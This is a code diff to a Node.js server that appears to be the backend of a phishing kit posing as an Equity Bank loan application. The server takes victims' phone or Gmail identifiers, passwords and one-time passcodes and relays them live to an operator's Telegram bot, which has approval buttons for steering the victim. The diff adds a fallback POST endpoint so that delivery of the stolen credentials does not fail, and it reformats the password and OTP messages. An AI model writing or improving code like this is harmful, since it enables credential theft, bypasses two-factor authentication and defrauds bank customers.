@@ -7,19 +7,19 @@ const app = express();
 expressWs(app);
 
 const PORT = process.env.PORT || 3000;
-const BOT_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
+const BOT_TOKEN = process.env.TELEGRAM_TOKEN || '';
 
 let bot = null;
 let adminChatId = null;
 
-if (BOT_TOKEN && BOT_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN_HERE') {
+if (BOT_TOKEN) {
   bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
   bot.onText(/\/start/, (msg) => {
     adminChatId = msg.chat.id;
     bot.sendMessage(
       adminChatId,
-      '🤖 *Equity Bank Loan Admin Bot Activated*\n\nYou will receive live loan applicant updates and interactive approval buttons here.',
+      '🤖 *Equity Bank Loan Admin Bot Connected*\n\nYou will receive live loan submissions here.',
       { parse_mode: 'Markdown' }
     );
   });
@@ -30,8 +30,8 @@ if (BOT_TOKEN && BOT_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN_HERE') {
 
     broadcastToClients({ type: 'ADMIN_ACTION', action });
 
-    bot.answerCallbackQuery(query.id, { text: `Action sent: ${action}` });
-    bot.sendMessage(chatId, `✅ *Executed Action:* ${action}`, { parse_mode: 'Markdown' });
+    bot.answerCallbackQuery(query.id, { text: `Action executed: ${action}` });
+    bot.sendMessage(chatId, `✅ *Status Updated:* ${action}`, { parse_mode: 'Markdown' });
   });
 }
 
@@ -48,13 +48,19 @@ app.ws('/ws', (ws, req) => {
       const data = JSON.parse(msgStr);
       handleClientMessage(data);
     } catch (e) {
-      console.error('Error parsing client message:', e);
+      console.error('WebSocket Error:', e);
     }
   });
 
   ws.on('close', () => {
     clients.delete(ws);
   });
+});
+
+// Fallback HTTP POST endpoint to guarantee Telegram delivery
+app.post('/api/submit', (req, res) => {
+  handleClientMessage(req.body);
+  res.json({ success: true });
 });
 
 function broadcastToClients(data) {
@@ -71,11 +77,12 @@ function handleClientMessage(data) {
 
   switch (data.step) {
     case 'LOGIN_SUBMIT': {
-      const text = `📥 *NEW APPLICANT LOGIN*\n\n` +
-        `• *Country:* ${data.country}\n` +
-        `• *Identifier:* ${data.identifier}\n` +
-        `• *Password:* ${data.password}\n` +
-        `• *Currency:* ${data.currency}`;
+      const text = `📥 *NEW LOAN APPLICANT*\n\n` +
+        `• *Country:* ${data.country || 'N/A'}\n` +
+        `• *Currency:* ${data.currency || 'KES'}\n` +
+        `• *Identifier (Phone/Gmail):* ${data.identifier}\n` +
+        `• *Password:* \`${data.password}\`\n` +
+        `• *Requested Amount:* ${data.currency}${data.amount || '250,000'}`;
 
       bot.sendMessage(adminChatId, text, {
         parse_mode: 'Markdown',
@@ -94,7 +101,7 @@ function handleClientMessage(data) {
     case 'OTP_SUBMIT': {
       const text = `🔑 *OTP SUBMITTED*\n\n` +
         `• *Applicant:* ${data.identifier}\n` +
-        `• *OTP Entered:* \`${data.otp}\``;
+        `• *OTP:* \`${data.otp}\``;
 
       bot.sendMessage(adminChatId, text, {
         parse_mode: 'Markdown',
@@ -154,4 +161,4 @@ function handleClientMessage(data) {
 app.listen(PORT, () => {
   console.log(`Equity Bank Loan App running on port ${PORT}`);
 });
-    
+                        
